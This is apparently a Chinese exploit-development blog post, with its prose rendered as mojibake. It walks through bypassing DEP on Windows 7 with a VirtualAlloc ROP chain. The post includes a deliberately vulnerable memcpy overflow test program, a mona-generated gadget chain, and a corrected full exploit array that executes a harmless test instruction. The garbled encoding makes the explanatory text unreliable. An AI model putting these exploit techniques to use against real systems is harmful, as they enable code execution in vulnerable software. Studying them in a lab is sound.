I"æ><h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>æ¥ç€ä»‹ç»DEPç»•è¿‡çš„å¦ä¸€ç§æ–¹æ³•â€”â€”åˆ©ç”¨VirtualAllocç»•è¿‡DEPã€‚é€šè¿‡VirtualAllocå‡½æ•°å¯ä»¥ç”³è¯·ä¸€æ®µå…·æœ‰å¯æ‰§è¡Œå±æ€§çš„å†…å­˜ï¼Œç›¸æ¯”äºVirtualProtectï¼Œä¼ å…¥VirtualAllocçš„å››ä¸ªå‚æ•°ä¸éœ€è¦å…ˆè¯»å–å†èµ‹å€¼ï¼Œå¯åœ¨shellcodeä¸­ç›´æ¥æŒ‡å®šï¼Œç»“æ„æ›´ç®€å•ã€‚å½“ç„¶ï¼Œåˆ©ç”¨Immunity Debuggerçš„monaæ’ä»¶å¯è‡ªåŠ¨æ„é€ åˆ©ç”¨VirtualAllocç»•è¿‡DEPçš„ROPé“¾ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>
    <p>è°ƒç”¨VirtualAllocå‡½æ•°æ—¶çš„BugåŠä¿®å¤</p>
  </li>
  <li>
    <p>é€‰æ‹©åˆé€‚çš„æ›¿ä»£æŒ‡ä»¤ï¼Œä¿®æ”¹monaè‡ªåŠ¨ç”Ÿæˆçš„ropé“¾ï¼Œå®ç°åˆ©ç”¨</p>
  </li>
  <li>
    <p>åˆ©ç”¨VirtualAllocç»•è¿‡DEPæ—¶éœ€è¦è€ƒè™‘çš„ç»†èŠ‚ï¼Œå¦‚å¯¹shellcodeçš„é•¿åº¦è¦æ±‚</p>
  </li>
</ul>

<h2 id="0x02-ç›¸å…³æ¦‚å¿µ">0x02 ç›¸å…³æ¦‚å¿µ</h2>
<hr />

<p><strong>VirtualAlloc:</strong></p>

<p>LPVOID WINAPI VirtualAlloc(
LPVOID  lpAddress,
SIZE_T  dwSize,
DWORD flAllocationType,
DWORD flProtect
)</p>

<p>lpAddress:ç”³è¯·å†…å­˜åŒºåŸŸçš„åœ°å€
dwSize:ç”³è¯·å†…å­˜åŒºåŸŸçš„å¤§å°
flAllocationType:ç”³è¯·å†…å­˜çš„ç±»å‹
flProtect:ç”³è¯·å†…å­˜çš„è®¿é—®æ§åˆ¶ç±»å‹</p>

<p>ç”³è¯·æˆåŠŸæ—¶å‡½æ•°è¿”å›ç”³è¯·å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œç”³è¯·å¤±è´¥æ—¶è¿”å›NULL</p>

<h2 id="0x03-å®é™…æµ‹è¯•">0x03 å®é™…æµ‹è¯•</h2>
<hr />

<p><strong>æµ‹è¯•ç¯å¢ƒï¼š</strong></p>

<ul>
  <li>æµ‹è¯•ç³»ç»Ÿï¼š Win 7</li>
  <li>ç¼–è¯‘å™¨ï¼š  VS2012</li>
  <li>buildç‰ˆæœ¬ï¼š  Release</li>
</ul>

<p><strong>é¡¹ç›®å±æ€§ï¼š</strong></p>

<ul>
  <li>å…³é—­GS</li>
  <li>å…³é—­ä¼˜åŒ–</li>
  <li>å…³é—­SEH</li>
  <li>æ‰“å¼€DEP</li>
  <li>å…³é—­ASLR</li>
  <li>ç¦ç”¨c++å¼‚å¸¸</li>
  <li>ç¦ç”¨å†…éƒ¨å‡½æ•°</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¦ç»†é…ç½®æ–¹æ³•åœ¨ä¸Šç¯‡æ–‡ç« æœ‰è¯´æ˜</p>

<p>åŒæ ·æ˜¯æµ‹è¯•memcpyçš„ç¼“å†²å™¨æº¢å‡ºï¼Œæµ‹è¯•POCå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x41414141,  
      0x41414141
};
void test()
{
  char buffer[48];  
  printf("3\n");
  memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
  printf("1\n");
  test();
  return 0;
}
</code></pre></div></div>

<p>ç¼–è¯‘æˆexeï¼Œä½¿ç”¨Immunity Debuggeræ‰“å¼€</p>

<p>ä½¿ç”¨monaæ’ä»¶è‡ªåŠ¨ç”Ÿæˆropé“¾ï¼Œè¾“å…¥ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">!mona rop -m *.dll -cp nonull</code></p>

<p>æŸ¥çœ‹rop_chains.txtï¼Œä¼šåˆ—å‡ºå¯ç”¨æ¥å…³é—­DEPçš„ROPé“¾</p>

<p>é€‰æ‹©VirtualAllocå‡½æ•°ï¼Œè¯¦æƒ…å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &amp;VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------

ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------
*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );
</code></pre></div></div>

<h3 id="æµ‹è¯•1">æµ‹è¯•1ï¼š</h3>

<p>å¡«å…¥ä¸Šè¿°ROPé“¾ï¼Œæ¥ç€åŠ ä¸Šæµ‹è¯•çš„å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUSH 1;
POP ECX;
</code></pre></div></div>

<p>å¯¹åº”æœºå™¨ç ä¸º0x9059016A</p>

<p>ç»„åˆåçš„POCå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
      
      0x9059016A,  //PUSH 1  // POP ECX 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
void test()
{
  char buffer[48];  
  printf("3\n");
  memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
  printf("1\n");
  test();
  char Buf[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  return 0;
}
</code></pre></div></div>

<p>ä½¿ç”¨OllyDbgæ‰“å¼€ï¼Œå•æ­¥è·Ÿè¸ªåˆ°VirtualAllocEx()å‡½æ•°å…¥å£ç‚¹</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-1.png" alt="Alt text" /></p>

<p>å¦‚å›¾ï¼ŒæŸ¥çœ‹ä¼ å…¥çš„å‡½æ•°å‚æ•°</p>

<p>ç”³è¯·å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ä¸º0x0012FF38
ç”³è¯·å†…å­˜åŒºåŸŸçš„å¤§å°ä¸º0x0000D101,æ¢ç®—æˆåè¿›åˆ¶ä¸º53505
ç”³è¯·å†…å­˜çš„ç±»å‹ä¸º0x00001000
ç”³è¯·å†…å­˜çš„è®¿é—®æ§åˆ¶ç±»å‹ä¸º0x00000040ï¼Œå³PAGE_EXECUTE_READWRITE</p>

<p>æŒ‰F8å•æ­¥è·Ÿè¸ªï¼Œå¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-2.png" alt="Alt text" /></p>

<p>è¿”å›å€¼EAXä¸º0,è¡¨ç¤ºç”Ÿæˆå¤±è´¥</p>

<p>æŸ¥æ‰¾åŸå› ï¼Œæ ¹æ®ä¹‹å‰çš„ç»éªŒï¼ŒçŒœæµ‹æ˜¯ç”³è¯·å†…å­˜åŒºåŸŸè¿‡é•¿å¯¼è‡´</p>

<h3 id="æµ‹è¯•2">æµ‹è¯•2ï¼š</h3>

<p>å°è¯•ä¿®æ”¹å†…å­˜å¤§å°</p>

<p>ç”³è¯·å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ä¸º0x0012FF38ï¼Œè·ç¦»å½“å‰å†…å­˜é¡µç»“æŸè¿˜æœ‰200å­—èŠ‚(0x00130000-0x0012FF38)</p>

<p>çŒœæµ‹ä¿®æ”¹çš„å†…å­˜é•¿åº¦å°äºç­‰äº200æ‰èƒ½æ»¡è¶³æ¡ä»¶</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-3.png" alt="Alt text" /></p>

<p>å¦‚ä¸Šå›¾ï¼Œå°†å†…å­˜é•¿åº¦è®¾ç½®ä¸º200(0x000000C8)</p>

<p>æŒ‰F8å•æ­¥è·Ÿè¸ªï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-4.png" alt="Alt text" /></p>

<p>ç”³è¯·æˆåŠŸï¼Œå‡½æ•°è¿”å›ç”³è¯·å†…å­˜çš„èµ·å§‹åœ°å€</p>

<p>ç‰¹åˆ«æ³¨æ„çš„æ˜¯æ­¤å¤„ä¸ºå½“å‰å†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼š0x0012F000ï¼ˆè€Œä¸æ˜¯ä¼ å…¥çš„å†…å­˜èµ·å§‹åœ°å€0x0012FF38ï¼‰</p>

<h3 id="æµ‹è¯•3">æµ‹è¯•3ï¼š</h3>

<p>å†æ¬¡æµ‹è¯•ï¼Œå°†é•¿åº¦è®¾ç½®ä¸º201ï¼Œåˆ†é…å†…å­˜å¤±è´¥</p>

<p>æ ¹æ®ä»¥ä¸Šæµ‹è¯•ç»“æœï¼ŒçŒœæµ‹ï¼šVirtualAllocEx()å‡½æ•°æ— æ³•è·¨å†…å­˜é¡µç”³è¯·å†…å­˜</p>

<h3 id="æµ‹è¯•4">æµ‹è¯•4ï¼š</h3>

<p>ç»§ç»­æµ‹è¯•ï¼Œ å°†é•¿åº¦è®¾ç½®ä¸º1ï¼Œå‡½æ•°è¿”å›å½“å‰å†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼š0x0012F000ï¼Œå¹¶ä¸”shellcodeæˆåŠŸæ‰§è¡Œ</p>

<p>è¯´æ˜ä¼ å…¥çš„å‡½æ•°é•¿åº¦å¯¹åˆ†é…å†…å­˜æ²¡æœ‰å½±å“ï¼Œä½†æ˜¯åŠ ä¸Šç”³è¯·å†…å­˜çš„èµ·å§‹åœ°å€åå¿…é¡»å°äºå½“å‰å†…å­˜é¡µçš„é•¿åº¦</p>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æº¢å‡ºè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡VirtualAllocEx()å‡½æ•°ç”³è¯·çš„å†…å­˜å¤§å°ä¸ºå›ºå®šå€¼</p>

<p>ç°åœ¨ï¼Œæˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨ä¿®æ”¹æ ˆåœ°å€å®ç°äº†DEPçš„ç»•è¿‡ï¼Œä¸‹é¢å°†å¯»æ‰¾åˆé€‚çš„æ›¿æ¢æŒ‡ä»¤ï¼Œæ„å»ºè‡ªå·±çš„ROPé“¾ï¼Œè§£å†³monaè‡ªåŠ¨ç”Ÿæˆäº§ç”Ÿçš„BUG</p>

<p>PUSHADè¡¨ç¤ºå°†æ‰€æœ‰å¯„å­˜å™¨çš„å€¼å…¥æ ˆï¼Œå…¥æ ˆé¡ºåºä¸ºEAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</p>

<p>è·Ÿè¸ªåˆ°PUSHADï¼Œå¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-5.png" alt="Alt text" /></p>

<p>EBXå­˜å‚¨å†…å­˜çš„é•¿åº¦ï¼Œéœ€è¦å°†EBXä¿®æ”¹ä¸ºå°äº201çš„å€¼</p>

<h2 id="0x04-æŸ¥æ‰¾æ›¿ä»£æŒ‡ä»¤æ„é€ ropé“¾">0x04 æŸ¥æ‰¾æ›¿ä»£æŒ‡ä»¤ï¼Œæ„é€ ROPé“¾</h2>
<hr />

<p>åœ¨rop.txtä¸­å¯»æ‰¾åˆé€‚çš„æ›¿ä»£æŒ‡ä»¤</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-6.png" alt="Alt text" /></p>

<p>å¦‚ä¸Šå›¾ï¼Œæœç´¢å…³é”®è¯EBX,æ‰¾åˆ°ä¸€æ¡åˆé€‚çš„æ›¿ä»£æŒ‡ä»¤ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">0x771c80a2 :  # XOR EAX,EAX # POP EBX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}</code></p>

<p><code class="language-plaintext highlighter-rouge">XOR EAX,EAX</code> ä¼šå°†å¯„å­˜å™¨EAXçš„å€¼æ¸…é›¶
<code class="language-plaintext highlighter-rouge">POP EBX</code> ä¼šä»æ ˆé¡¶å–å€¼å¹¶èµ‹å€¼ç»™EBX</p>

<p>é€‰æ‹©åˆé€‚çš„ä½ç½®ï¼Œå¹¶ä¸ºEBXèµ‹å€¼,éœ€è¦æ³¨æ„ï¼š</p>

<p>è¯¥æŒ‡ä»¤å°†å¯„å­˜å™¨EAXçš„å€¼æ¸…é›¶ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸EAXå¯„å­˜å™¨å€¼æ— å…³çš„ä½ç½®</p>

<p>POP EBXä¼šè¯»å–ä¸‹ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹ï¼Œå¹¶èµ‹å€¼ç»™EBXï¼Œæ‰€ä»¥åé¢æ¥ä¸ŠEBXçš„å€¼å°±å¥½ï¼Œä¾‹å¦‚0x00000028, // Set EBX=0x00000028(40)</p>

<p>æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ä½ç½®ï¼Œæ”¾åœ¨<code class="language-plaintext highlighter-rouge"> 0x693a7031,  // POP EAX // RETN [MSVCR110.dll]</code> å‰é¢</p>

<p>å®Œæ•´shellcodeå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // &amp; call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]

    0x771c80a2, // # XOR EAX,EAX # POP EBX # RETN   [kernel32.dll]   |   {PAGE_EXECUTE_READ}
    0x00000028, // Set EBX=0x00000028(40)

    0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
      
      0x9059016A,  //PUSH 1  // POP ECX 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
</code></pre></div></div>

<p>é‡æ–°ç¼–è¯‘ï¼Œä½¿ç”¨OllyDbgæ‰“å¼€ï¼Œå•æ­¥è·Ÿè¸ªåˆ°VirtualAllocEx()å‡½æ•°å…¥å£ç‚¹</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-7.png" alt="Alt text" /></p>

<p>å¦‚å›¾ï¼ŒæŸ¥çœ‹ä¼ å…¥çš„å‡½æ•°å‚æ•°</p>

<p>å†…å­˜é•¿åº¦è¢«ä¿®æ”¹ä¸º0x00000028(40)ï¼Œå…¶ä»–ä¼ å…¥å‚æ•°æ­£å¸¸</p>

<p>ç»§ç»­è¿è¡Œï¼Œè¿›å…¥<code class="language-plaintext highlighter-rouge">CALL ESP</code>ï¼ŒshellcodeæˆåŠŸæ‰§è¡Œ</p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>åˆ©ç”¨VirtualAllocç»•è¿‡DEPåŒåˆ©ç”¨VirtualProtectç»•è¿‡DEPä¸€æ ·ï¼Œéƒ½éœ€è¦æ³¨æ„å†…å­˜é¡µé•¿åº¦çš„é™åˆ¶ï¼Œæ— æ³•è·¨é¡µä¿®æ”¹æˆ–è€…ç”³è¯·å†…å­˜ï¼Œè¿™å°±å¯¹shellcodeçš„é•¿åº¦æå‡ºäº†è¦æ±‚</p>

<p>å½“ç„¶ï¼Œæ­£å¸¸è°ƒç”¨APIå®ç°VirtualProtectå’ŒVirtualAllocä¸ä¼šå­˜åœ¨è·¨å†…å­˜é¡µå¤±è´¥çš„é—®é¢˜</p>

<p>monaè‡ªåŠ¨ç”Ÿæˆçš„ropé“¾å¯ä½œä¸ºå‚è€ƒæ¨¡æ¿ï¼Œç»“åˆrop.txtä¸‹çš„æ›¿ä»£æŒ‡ä»¤ï¼Œå¯æ„é€ æ›´åˆé€‚çš„ROPé“¾</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET